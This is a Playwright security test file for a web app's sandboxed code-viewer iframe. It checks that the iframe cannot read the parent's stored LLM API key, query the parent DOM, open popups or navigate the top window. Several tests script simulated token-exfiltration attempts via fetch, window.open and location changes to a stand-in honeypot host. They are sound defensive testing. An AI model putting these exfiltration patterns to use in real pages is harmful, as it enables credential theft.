import { test, expect, type Page } from '@playwright/test';

test.describe('App-level iframe and LLM security', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('http://localhost:5173');
    await page.evaluate(() => {
      localStorage.setItem('codevinci-llm-enabled', 'true');
      localStorage.setItem('codevinci-llm-config', JSON.stringify({
        provider: 'openai-compatible',
        apiEndpoint: 'http://localhost:11434/v1',
        apiKey: 'sk-test-secret-key-12345',
        defaultModel: 'gpt-4o',
        systemPrompt: 'You are a test assistant.',
        availableModels: ['gpt-4o'],
        connectionValid: true,
        temperature: 0.7,
        topP: 0.95,
        maxTokens: 4096,
        cspOrigin: 'http://localhost:11434',
      }));
    });
    await page.reload();
  });

  test('viewer iframe has sandbox="allow-scripts" without allow-same-origin', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    await page.selectOption('select', 'view-edit');
    await page.waitForTimeout(1000);

    const sandbox = await page.locator('iframe[sandbox="allow-scripts"]').getAttribute('sandbox');
    expect(sandbox).toBe('allow-scripts');

    const fullSandbox = await page.locator('iframe').first().getAttribute('sandbox');
    expect(fullSandbox?.split(' ')).not.toContain('allow-same-origin');
  });

  test('attack: iframe cannot steal token via localStorage read', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    await page.selectOption('select', 'view-edit');
    await navigateToFrame(page);

    const result = await frame(page).evaluate(() => {
      try {
        (parent as Window).localStorage.getItem('codevinci-llm-config');
        return { blocked: false as const };
      } catch {
        return { blocked: true as const };
      }
    });
    expect(result.blocked).toBe(true);
  });

  test('attack: iframe cannot steal token via parent DOM query', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    await page.selectOption('select', 'view-edit');
    await navigateToFrame(page);

    const result = await frame(page).evaluate(() => {
      try {
        const val = (parent as Window).document.querySelector('input')?.value;
        return { blocked: false as const, value: val };
        return { blocked: false as const };
      } catch {
        return { blocked: true as const };
      }
    });
    expect(result.blocked).toBe(true);
  });

  test.describe('Network isolation', () => {
    test.beforeEach(async ({ page }) => {
      await setupAndAcceptDisclaimer(page);
      await page.selectOption('select', 'view-edit');
      await navigateToFrame(page);
    });

    test('iframe can send requests to any origin (honeypot catches it)', async ({ page }) => {
      const token = crypto.randomUUID();
      let captured: string | undefined;

      await page.route('**/csp-test-honeypot.local/**', (route) => {
        const url = new URL(route.request().url());
        captured = url.searchParams.get('token') ?? undefined;
        route.abort();
      });

      await frame(page).evaluate(async ({ t }) => {
        try { await fetch('https://csp-test-honeypot.local/verify?token=' + t); } catch { /* request aborted by route */ }
      }, { t: token });

      await page.waitForTimeout(500);
      expect(captured).toBe(token);
    });

    test('sandbox blocks window.open popup', async ({ page }) => {
      let caught = false;
      await page.route('**/csp-test-honeypot.local/**', () => { caught = true; });

      await frame(page).evaluate((url) => {
        try { window.open(url + '/popup?key=test'); } catch { /* sandbox blocks popups */ }
      }, 'https://csp-test-honeypot.local');
      await page.waitForTimeout(500);

      expect(caught).toBe(false);
    });

    test('sandbox blocks top navigation', async ({ page }) => {
      await frame(page).evaluate((url) => {
        try { (parent as Window).location.href = url + '/steal?key=test'; } catch { /* sandbox blocks navigation */ }
      }, 'https://csp-test-honeypot.local');
    });
  });

  test('CSP meta tag on parent page includes all required directives', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    const csp = await page.evaluate(() =>
      document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content')
    );
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'self'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).not.toContain("'unsafe-eval'");
  });
});

function frame(page: Page) {
  // Viewer loads from /viewer.html via src= attribute
  const f = page.frames().find(f => f.url().includes('/viewer.html'));
  if (!f) throw new Error('iframe frame not found');
  return f;
}

async function navigateToFrame(page: Page) {
  await page.waitForSelector('iframe[sandbox="allow-scripts"]', { timeout: 5000 });
  await page.waitForTimeout(1500);
  expect(frame(page)).toBeDefined();
}

async function setupAndAcceptDisclaimer(page: Page) {
  await page.getByRole('button', { name: 'Run code' }).click();
  await page.waitForTimeout(500);
}
